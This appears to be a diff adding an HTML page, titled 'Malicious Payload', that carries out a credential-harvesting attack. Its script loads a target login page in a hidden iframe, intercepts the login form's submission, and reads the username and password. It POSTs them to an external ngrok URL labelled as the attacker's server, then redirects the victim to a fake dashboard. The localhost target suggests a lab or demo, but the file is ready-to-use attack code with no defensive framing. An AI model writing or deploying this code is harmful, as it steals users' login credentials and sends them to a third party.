@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Payload</title>
+</head>
+<body>
+    <h1>Loading...This may take a while</h1>
+    <p>If you see this message, something went wrong.</p>
+
+    <script>
+        // Create an invisible iframe to load the target login page
+        const iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        iframe.src = "http://localhost:8080"; // Update with the correct path to the target page
+        document.body.appendChild(iframe);
+
+        iframe.onload = function() {
+            try {
+                const iframeDoc = iframe.contentWindow.document;
+
+                // Wait until the form is loaded
+                const loginForm = iframeDoc.getElementById("loginForm");
+                loginForm.addEventListener("submit", function(event) {
+                    event.preventDefault(); // Prevents the actual form submission
+                    const username = iframeDoc.getElementById("username").value;
+                    const password = iframeDoc.getElementById("password").value;
+
+                    // Send the captured credentials to the attacker’s server
+                    fetch("https://2f89-186-96-33-84.ngrok-free.app/", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+                    }).then(() => {
+                        // After capturing, redirect to the fake dashboard page to complete the illusion
+                        iframeDoc.location.href = "dashboard.html";
+                    });
+                });
+            } catch (error) {
+                console.error("Could not access the target's data. Possible cross-origin restriction:", error);
+            }
+        };
+    </script>
+</body>
+</html>
+
